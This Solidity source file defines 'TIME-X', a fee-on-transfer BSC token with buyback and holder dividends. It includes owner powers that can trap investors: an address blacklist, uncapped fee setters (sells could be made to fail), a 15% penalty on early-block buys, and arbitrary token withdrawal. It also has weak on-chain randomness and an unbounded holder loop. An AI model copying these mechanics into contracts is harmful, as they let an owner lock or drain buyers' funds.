// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface TIME {
    function Buy(address usd, uint256 amount) external returns (bool);

    function Sell(address usd, uint256 time) external returns (bool);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token, address time) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
        IERC20(token).approve(time, uint256(~uint256(0)));
        IERC20(time).approve(msg.sender, uint256(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public TIMEAddress = 0x13460EAAeaDe9427957F26A570345490b5d7910F;
    address public usdtAddress = 0x55d398326f99059fF775485246999027B3197955;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 public _tTotal;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 200;
    uint256 public _buyLPFee = 0;
    uint256 public _buyLPDividendFee = 500; //lp
    uint256 public _buy_BurnFee = 300; // BUYBACK

    uint256 public _sellFundFee = 200;
    uint256 public _sellLPFee = 0;
    uint256 public _sellLPDividendFee = 500;
    uint256 public _sell_BurnFee = 300;

    uint256 public airDropNumbs = 3; //airdrop
    uint256 public swapAtAmount = 10000000 * 10**18;

    uint256 public startTradeBlock = 3;

    address public _mainPair;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address RouterAddress,
        address FISTAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        address FundAddress,
        address ReceiveAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);
        IERC20(usdtAddress).approve(address(TIMEAddress), MAX);

        _fist = FISTAddress;

        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10**Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(this)] = true;
        excludeHolder[_mainPair] = true;
        excludeHolder[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        holderRewardCondition = 100 * 10**IERC20(TIMEAddress).decimals();
        holder_minimum_requirement = 5000000 * 10**18;

        _tokenDistributor = new TokenDistributor(FISTAddress, TIMEAddress);
    }

    function setSwapAtAmount(uint256 newValue) public onlyOwner {
        swapAtAmount = newValue * 10**18;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setAirDropNumbs(uint256 newNumbs) public onlyOwner {
        airDropNumbs = newNumbs;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function generateRandomNumber() public view returns (uint256) {
        uint256 randomNumber = (uint256(
            keccak256(
                abi.encodePacked(block.timestamp, block.difficulty, msg.sender)
            )
        ) % 100) + 1;
        return randomNumber;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "bcd address");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = (balance * 9999) / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool takeFee;
        bool isSell;
        // 1. 确保买入卖出 是否收税
        if (_swapPairList[from] || _swapPairList[to]) {
            // 确保这是一个代币交换操作时触发
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                // 如果非白名单地址

                if (0 == startTradeBlock) {
                    // 没开启交易
                    return;
                }
                if (block.number < startTradeBlock + 3 && !_swapPairList[to]) {
                    // 杀前三个区块
                    _funTransfer(from, to, amount);
                    return;
                }

                // 3. 触发营销及分红
                if (_swapPairList[to]) {
                    // 确保这是一个代币交换操作
                    if (!inSwap) {
                        processReward();
                        // 避免在进行代币交换时触发重入攻击或重复的代币兑换操作
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > swapAtAmount) {
                            swapTokenForFund(contractTokenBalance);
                        }
                    }
                }

                takeFee = true; // 非白名单 收税
            }

            if (_swapPairList[to]) {
                //判断是否是卖出操作
                isSell = true;

                // 分发地址映射 sell
                if (
                    !_feeWhiteList[from] &&
                    !_feeWhiteList[to] &&
                    airDropNumbs > 0
                ) {
                    address ad;
                    uint256 airDropAmount = generateRandomNumber();
                    for (uint256 i = 0; i < airDropNumbs; i++) {
                        ad = address(
                            uint160(
                                uint256(
                                    keccak256(
                                        abi.encodePacked(
                                            i,
                                            amount,
                                            block.timestamp
                                        )
                                    )
                                )
                            )
                        );
                        _basicTransfer(from, ad, airDropAmount * 10 **18);
                        amount -= airDropAmount;
                    }
                }
            }
        }
        // 2. 扣税 转账
        _tokenTransfer(from, to, amount, takeFee, isSell);

        // 检查把地址符合要求的列入holder
        if (amount >= holder_minimum_requirement) {
            addHolder(to);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 15) / 100;
        _takeTransfer(sender, fundAddress, feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee =
                    _sellFundFee +
                    _sellLPDividendFee +
                    _sellLPFee +
                    _sell_BurnFee;
            } else {
                swapFee =
                    _buyFundFee +
                    _buyLPDividendFee +
                    _buyLPFee +
                    _buy_BurnFee;
            }
            uint256 swapAmount = (tAmount * swapFee) / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this), swapAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        uint256 swapFee = _buyFundFee +
            _buyLPFee +
            _buyLPDividendFee +
            _buy_BurnFee +
            _sellFundFee +
            _sellLPFee +
            _sellLPDividendFee +
            _sell_BurnFee;

        if (swapFee == 0) return;
        uint256 burnFee = _buy_BurnFee + _sell_BurnFee;

        uint256 burnAmount = (tokenAmount * burnFee) / swapFee;
        // Burn 3%
        _basicTransfer(address(this), address(0xdead), burnAmount);
        // swap to u
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - burnAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));

        FIST.transferFrom(
            address(_tokenDistributor),
            address(this),
            fistBalance
        );

        if (fistBalance > 0) {
            // buy time
            require(buyTIME(fistBalance), "BUY TIME failed");
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function buyTIME(uint256 amount) public returns (bool) {
        TIME token = TIME(TIMEAddress);

        require(token.Buy(usdtAddress, amount), "Transfer failed");
        return true;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function multiFeeWhiteList(address[] calldata addresses, bool value)
        public
        onlyOwner
    {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _feeWhiteList[addresses[i]] = value;
        }
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function multiBlackList(address[] calldata addresses, bool value)
        public
        onlyOwner
    {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _blackList[addresses[i]] = value;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external onlyOwner {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(
        address token,
        uint256 amount,
        address to
    ) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    receive() external payable {}

    address[] public holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) isholder;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        if (!isholder[adr]) {
            holderIndex[adr] = holders.length;
            holders.push(adr);
            isholder[adr] = true;
        }
    }

    uint256 private holderRewardCondition;
    uint256 private holder_minimum_requirement;
    uint256 private progressRewardBlock;

    function processReward() private {
        if (progressRewardBlock + 50 > block.number) {
            return;
        }

        IERC20 time = IERC20(TIMEAddress);
        uint256 timeBalance = time.balanceOf(address(this));

        if (timeBalance < holderRewardCondition) return;

        uint256 Fee = _buyFundFee +
            _sellFundFee +
            _buyLPDividendFee +
            _sellLPDividendFee;
        uint256 rewardAmount = (timeBalance * (_buyLPDividendFee + _sellLPDividendFee)) / Fee;

        IERC20 holdToken = IERC20(address(this));

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;
        uint256 timeSentTotal = 0;

        uint256 shareholderCount = holders.length;
        uint256 iterations = 0;

        while (iterations < shareholderCount) {
            shareHolder = holders[iterations];
            tokenBalance = holdToken.balanceOf(shareHolder);

            if (
                tokenBalance >= holder_minimum_requirement &&
                !excludeHolder[shareHolder]
            ) {
                amount = rewardAmount * tokenBalance / _tTotal;
                if (amount > 0) {
                    time.transfer(shareHolder, amount);
                    timeSentTotal += amount;
                }
            }
            iterations++;
        }

        time.transfer(fundAddress, timeBalance - timeSentTotal);
        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setholderminimumrequirement(uint256 amount) external onlyOwner {
        holder_minimum_requirement = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }


}

contract TIMEX is AbsToken {
    constructor()
        AbsToken(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 
            address(0x55d398326f99059fF775485246999027B3197955),
            "TIME-X",
            "TIME-X",
            18,
            202300000000,
            address(0xF6B92dF0C73a0Edb3724414fEBDb3698aac4e624),
            address(0x6f729F1DEa4ede5CcCa691fBFb0dc840Cd5bdc12)
        )
    {}
}